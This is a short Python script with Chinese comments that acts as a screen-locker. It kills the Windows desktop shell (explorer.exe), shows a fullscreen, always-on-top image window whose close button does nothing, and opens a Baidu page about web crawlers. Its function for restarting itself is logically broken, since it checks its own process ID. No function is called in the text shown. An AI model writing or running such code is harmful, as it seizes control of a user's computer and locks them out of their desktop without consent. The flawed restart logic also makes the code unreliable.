from psutil import pid_exists as pidExists # 导入psutil模块 用于进程管理
from webbrowser import open as webOpen # 导入webbrowser模块 用于打开网页
from tkinter import Label, Tk # 导入tkinter模块 用于创建窗口
from PIL import Image, ImageTk # 导入PIL模块 用于图片处理
import sys # 导入sys模块 用于获取当前程序路径
from os import path, system, getpid, execl  # 导入os模块 用于文件操作


# 打开网页
def openWebPage():
    try: webOpen("https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB") # 使用默认浏览器打开指定的网页
    except: pass # 忽略错误


# 结束桌面程序
def endDesktopProgram():
    try: system("taskkill /f /im explorer.exe") # 结束桌面程序
    except: pass # 忽略错误


# 创建全屏窗口
def fullScreenWindow():
    try:
        root = Tk() # 创建窗口
        root.attributes('-fullscreen', True)  # 设置窗口为全屏
        root.attributes('-topmost', True)  # 窗口置顶显示
        root.protocol("WM_DELETE_WINDOW", lambda: None) # 禁止关闭窗口
        img = Image.open(path.join(sys._MEIPASS, "logo.jpg") if getattr(sys, 'frozen', False) else "static/image/logo.jpg") # 打开图片
        photo = ImageTk.PhotoImage(img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)) # 缩放图片
        label = Label(root, image=photo) # 创建标签
        label.pack(fill='both', expand=True) # 填充窗口
        root.mainloop() # 运行窗口 
    except: pass # 忽略错误


# 监控进程，如果进程不存在则重启
def monitorProcess():
    pid = getpid()  # 获取当前进程pid
    while True:  # 循环监控
        if not pidExists(pid): execl(sys.executable, sys.executable, *sys.argv)  # 重启进程
 
